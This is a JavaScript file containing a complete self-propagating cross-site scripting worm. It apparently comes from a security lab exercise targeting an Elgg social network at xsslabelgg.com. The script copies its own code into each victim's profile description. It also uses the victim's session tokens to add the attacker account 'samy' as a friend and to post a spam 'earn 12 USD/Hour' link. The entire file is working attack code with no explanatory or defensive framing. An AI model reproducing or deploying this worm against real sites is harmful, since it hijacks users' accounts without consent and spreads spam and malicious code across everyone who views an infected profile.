function randomString(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {result += characters.charAt(Math.floor(Math.random() * charactersLength));}
    return result;
}

window.onload = function () {
    var headerTag = "<script id=\"worm\">";
    var innerCode = document.getElementById("worm").innerHTML;
    var tailTag = "</"+"script>";

    var wormCode = encodeURIComponent(headerTag+innerCode+tailTag);
    
    var guid = "&guid="+elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var description = "&description="+wormCode+"&accesslevel[description]=1";

    var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
    var editContent =  guid + ts + token + description;

    var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;

    let link = "To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/samy"
    var body = "&body="+link;
    var sendurlWirePost = "http://www.xsslabelgg.com/action/thewire/add";
    var contentWirePost = ts + token + body;

    var samyGuid = 47;

    if(elgg.session.user.guid!=samyGuid){
        
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurlPOST, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(editContent);

        
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurlGET, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();


        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurlWirePost, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(contentWirePost);
    }

}
